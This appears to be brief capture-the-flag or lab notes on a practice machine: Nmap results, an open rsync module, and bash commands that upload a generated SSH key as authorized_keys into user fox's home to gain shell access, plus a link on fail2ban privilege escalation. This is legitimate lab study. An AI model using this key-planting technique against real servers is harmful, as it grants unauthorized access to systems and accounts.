_____

> [!info]
> IP=192.168.229.126


# Nmap

```python
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
873/tcp open  rsync   (protocol version 31)
```

## 873 - rsync

https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync

```txt
fox
fox home
```



```bash
ssh-keygen -f testkey
cat testkey.pub > authorized_keys

rsync -av /home/kali/Documents/PGP/fail/test_shared/.ssh rsync://fox@$IP/fox/
```

https://exploit-notes.hdks.org/exploit/network/rsync-pentesting/

# PrivEsc

## fail2ban
https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49
